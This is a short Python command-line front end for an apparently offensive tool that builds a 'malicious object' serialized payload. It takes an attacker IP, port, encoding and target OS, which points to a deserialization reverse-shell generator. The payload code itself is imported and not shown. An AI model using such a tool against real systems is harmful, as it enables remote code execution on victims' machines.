import argparse
from .run import ObjetoMalicioso
from argparse import RawTextHelpFormatter

def banner():
    return """                                                                                                                                            
                 ,--.                            ,--.        ,--.,--.               
 ,---.,--. ,--.,-|  | ,---.  ,---.  ,---. ,--.--.`--' ,--,--.|  |`--',-----. ,---.  
| .-. |\  '  /' .-. || .-. :(  .-' | .-. :|  .--',--.' ,-.  ||  |,--.`-.  / | .-. : 
| '-' ' \   ' \ `-' |\   --..-'  `)\   --.|  |   |  |\ '-'  ||  ||  | /  `-.\   --. 
|  |-'.-'  /   `---'  `----'`----'  `----'`--'   `--' `--`--'`--'`--'`-----' `----' 
`--'  `---'                                                                                                                              
     v0.0.1 - @joaoviictorti                                                   
"""

def argumentos() -> None:
    
    parse = argparse.ArgumentParser(prog=banner(),usage="pyserialize -ip 192.168.4.113 -p 80 -o Windows",formatter_class=RawTextHelpFormatter)
    parse.add_argument("--verison",action="version",version="pydeserialize 0.0.4")
    parse.add_argument("-ip",action="store",type=str,dest="ip",required=True, help="Insert ip")
    parse.add_argument("-p",action="store",type=str,dest="port",required=True, help="Insert port")
    parse.add_argument("-e",action="store",type=str,dest="encode",choices=["b64","shell","urlencode","hex"],default="",required=True,help="Insert encoding")
    parse.add_argument("-o",action="store",type=str,dest="SO",choices=["Windows","Linux"],required=True,help="Insert operational system")
    args = parse.parse_args()
    
    ObjetoMalicioso(args.ip,args.port,args.encode,args.SO).Objeto_Serializado()